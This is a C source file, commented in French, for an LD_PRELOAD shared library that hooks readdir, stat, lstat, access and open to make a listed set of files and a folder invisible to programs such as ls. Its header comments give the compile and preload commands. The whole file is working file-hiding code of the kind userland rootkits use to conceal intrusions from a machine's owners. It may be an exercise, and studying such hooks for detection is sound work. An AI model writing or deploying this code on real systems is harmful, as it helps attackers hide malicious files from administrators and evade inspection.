//gcc -shared -fPIC -o cacher_fichiers.so cacher_fichiers.c -ldl
//LD_PRELOAD=./cacher_fichiers.so ls

#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>

// Liste des fichiers à cacher
const char *fichiers_a_cacher[] = {
        "test.txt",
        "fichier_secret2.txt",
        "dossier_secret",
        NULL // Fin de la liste
};

// Fonction utilitaire : vérifier si un fichier est dans la liste à cacher
int est_cache(const char *nom) {
    for (const char **fichier = fichiers_a_cacher; *fichier != NULL; fichier++) {
        if (strcmp(nom, *fichier) == 0) {
            return 1;
        }
    }
    return 0;
}

// Intercepter readdir pour cacher les fichiers dans les listes de répertoires
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*original_readdir)(DIR *) = NULL;
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (est_cache(entry->d_name)) {
            continue; // Ignorer les fichiers cachés
        }
        return entry;
    }
    return NULL; // Fin du répertoire
}

// Intercepter stat pour cacher les informations sur les fichiers
int stat(const char *pathname, struct stat *buf) {
    static int (*original_stat)(const char *, struct stat *) = NULL;
    if (!original_stat) {
        original_stat = dlsym(RTLD_NEXT, "stat");
    }

    if (est_cache(pathname)) {
        errno = ENOENT; // Fichier introuvable
        return -1;
    }
    return original_stat(pathname, buf);
}

// Intercepter lstat pour les liens symboliques
int lstat(const char *pathname, struct stat *buf) {
    static int (*original_lstat)(const char *, struct stat *) = NULL;
    if (!original_lstat) {
        original_lstat = dlsym(RTLD_NEXT, "lstat");
    }

    if (est_cache(pathname)) {
        errno = ENOENT; // Fichier introuvable
        return -1;
    }
    return original_lstat(pathname, buf);
}

// Intercepter access pour empêcher de vérifier l'existence des fichiers
int access(const char *pathname, int mode) {
    static int (*original_access)(const char *, int) = NULL;
    if (!original_access) {
        original_access = dlsym(RTLD_NEXT, "access");
    }

    if (est_cache(pathname)) {
        errno = ENOENT; // Fichier introuvable
        return -1;
    }
    return original_access(pathname, mode);
}

// Intercepter open pour empêcher l'ouverture des fichiers cachés
int open(const char *pathname, int flags, ...) {
    static int (*original_open)(const char *, int, ...) = NULL;
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }

    if (est_cache(pathname)) {
        errno = ENOENT; // Fichier introuvable
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);

    return original_open(pathname, flags, mode);
}
